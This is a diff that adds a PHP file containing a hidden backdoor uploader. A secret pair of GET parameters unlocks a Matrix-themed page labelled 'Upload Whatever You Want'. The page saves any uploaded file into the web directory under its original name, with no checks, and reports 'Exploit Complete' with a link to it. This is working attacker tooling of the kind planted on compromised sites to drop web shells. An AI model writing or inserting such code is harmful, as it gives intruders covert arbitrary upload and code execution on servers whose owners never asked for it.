@@ -1,0 +1,66 @@
+<?php
+if (isset($_GET['whoami']) && $_GET['parameter'] == "parameter") {
+    echo "<style>
+        html { background: black; }
+        h1 { color: lime; text-align: center; }
+        form { display: flex; flex-direction: column; align-items: center; }
+        label { margin-top: 20px; font-size: 18px; color: lime; }
+        input[type=\"file\"] { background-color: black; color: lime; border: 1px solid lime; padding: 10px; margin-top: 10px; }
+        input[type=\"file\"]:hover { background-color: lime; color: black; cursor: pointer; }
+        input[type=\"submit\"] { background-color: lime; color: black; border: 1px solid lime; padding: 10px; margin-top: 20px; cursor: pointer; }
+        input[type=\"submit\"]:hover { background-color: black; color: lime; }
+        a { text-decoration: none; }
+        .result { text-align: center; color: lime; margin-top: 30px; font-size: 20px; }
+        .result span { color: yellow; }
+        .matrix-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; z-index: -1; background-color: #000; opacity: 0.9; overflow: hidden; }
+        .matrix-bg:before { position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; z-index: -1; opacity: 0.6; animation: matrix-anim 20s linear infinite; }
+        @keyframes matrix-anim { 0% { transform: translateY(0); } 100% { transform: translateY(-100%); } }
+        .matrix-text { position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; z-index: -1; opacity: 1; animation: matrix-text-anim 2s linear infinite; }
+        @keyframes matrix-text-anim { 0% { opacity: 0; } 20% { opacity: 1; } 80% { opacity: 1; } 100% { opacity: 0; } }
+        .matrix-text span { position: absolute; display: block; width: 20px; height: 20px; font-size: 18px; line-height: 1; white-space: nowrap; transform: translateY(-100%); animation: animate 15s linear infinite; }
+        @keyframes animate { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+        canvas {display: block;}
+    </style>
+    <div class=\"matrix-bg\"><canvas></canvas></div>
+    <h1>Upload Whatever You Want</h1>
+    <form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
+        <label for=\"file\">We Become What We Thinkth About</label>
+        <input type=\"file\" name=\"file\" id=\"file\">
+        <input type=\"submit\" name=\"default\" value=\"Upload\">
+    </form>
+    <script>
+        var canvas = document.querySelector('canvas'), ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        var letters = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+        letters = letters.split('');
+        var fontSize = 10, columns = canvas.width / fontSize;
+        var drops = [];
+        for (var i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, .1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            for (var i = 0; i < drops.length; i++) {
+                var text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillStyle = '#0f0';
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                drops[i]++;
+                if (drops[i] * fontSize > canvas.height && Math.random() > .95) {
+                    drops[i] = 0;
+                }
+            }
+        }
+        setInterval(draw, 33);
+    </script>";
+
+    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["file"])) {
+        $uploadedFileName = $_FILES["file"]["name"];
+        $targetFilePath = $_FILES["file"]["name"];
+        move_uploaded_file($_FILES["file"]["tmp_name"], $targetFilePath);
+        echo "<div class=\"result\">Exploit Complete > <a href=\"$uploadedFileName\"><span>" . $_FILES["file"]["name"] . "</span></a></div>";
+    }
+    exit();
+}
+?>
